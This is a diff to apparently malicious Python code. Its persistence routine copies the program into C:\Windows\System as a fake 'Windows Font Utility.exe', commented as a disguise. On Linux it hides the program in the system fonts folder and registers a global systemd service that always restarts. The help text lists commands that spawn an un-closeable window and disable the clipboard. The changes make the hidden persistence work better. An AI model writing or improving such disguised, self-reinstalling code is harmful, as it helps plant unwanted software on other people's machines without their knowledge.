@@ -42,7 +42,7 @@ def resource_path(relative_path: Union[
 def persistence():
     #Windows
     if os.name == "nt":
-        location = "C:\\Windows\\System" + "\\WindowsFontUtility.exe"  # Disguise as a windows program
+        location = "C:\\Windows\\System" + r"\Windows Font Utility.exe"  # Disguise as a windows program
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call(
@@ -51,7 +51,7 @@ def persistence():
     #Linux
     else:
         location = "/usr/share/fonts/barascript"
-        filename = location + "/Barascript"
+        filename = location + "/Barascript.py"
         if not os.path.exists(filename):
             os.mkdir(location)
             os.system("cp -r copydata " + location)
@@ -62,23 +62,25 @@ After=graphical-session.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/python3 /usr/share/fonts/barascript/Barascript
-Restart=on-failure
+ExecStart=/usr/bin/python3 /usr/share/fonts/barascript/Barascript.py
+Restart=always
 Environment=PYTHONUNBUFFERED=1
 
 [Install]
 WantedBy=default.target"""
-            with open("/etc/systemd/user/barascript-utility-manager.service") as file:
+            os.system("touch /etc/systemd/user/barascript-utility-manager.service")
+            with open("/etc/systemd/user/barascript-utility-manager.service", "w") as file:
                 file.write(servicefile)
                 file.close()
-            os.system("systemctl enable barascript-utility-manager.service --global")
+            os.system("systemctl --global enable barascript-utility-manager.service")
+            os.system("chmod +x " + filename)
 
 def connect():
     help_text = """Available commands:
 help - Display this help message
 gort - Summons Gort
 bounce - Makes an un-closeable bouncing rodent 
-copybara - Permenantly render the clipboard unusable
+copybara - Render the clipboard unusable for the duration
 
 INTERACTIVE ONLY COMMANDS:
 duration [time] - sets duration
